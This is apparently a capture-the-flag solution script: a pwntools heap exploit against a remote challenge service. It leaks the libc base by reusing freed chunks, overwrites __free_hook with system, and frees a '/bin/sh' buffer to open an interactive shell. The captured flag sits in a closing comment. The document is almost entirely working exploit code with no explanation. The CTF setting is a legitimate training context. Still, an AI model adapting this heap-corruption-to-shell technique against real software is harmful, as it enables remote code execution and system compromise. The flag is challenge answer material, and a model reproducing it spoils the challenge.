from pwn import *
libc = ELF('./libc6-i386_2.23-0ubuntu11_amd64.so', checksec=False)
p = remote('not.codepwnda.id', 17667)
def create():
    p.sendlineafter(b'>', b'1')
def read(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b':', b'%d'%idx)
    return p.recvline().strip()[9:]
def write(idx, data):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b':', b'%d' % idx)
    p.sendlineafter(b':', b'%s' % data)
def delete(idx):
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b':', b'%d' % idx)

create()
create()
delete(0)
create()
create()
libc.address = u32(read(0)[:4].ljust(4, b'\x00')) - 0x1b07b0
log.info('base : 0x%x'%libc.address)
write(0, b'/bin/sh\x00' + b'A'*(0x40-8) + p32(libc.sym['__free_hook']))
write(1, p32(libc.sym['system']))
delete(0)
p.interactive()
#codepwnda{mantap_strukdat_mu_A}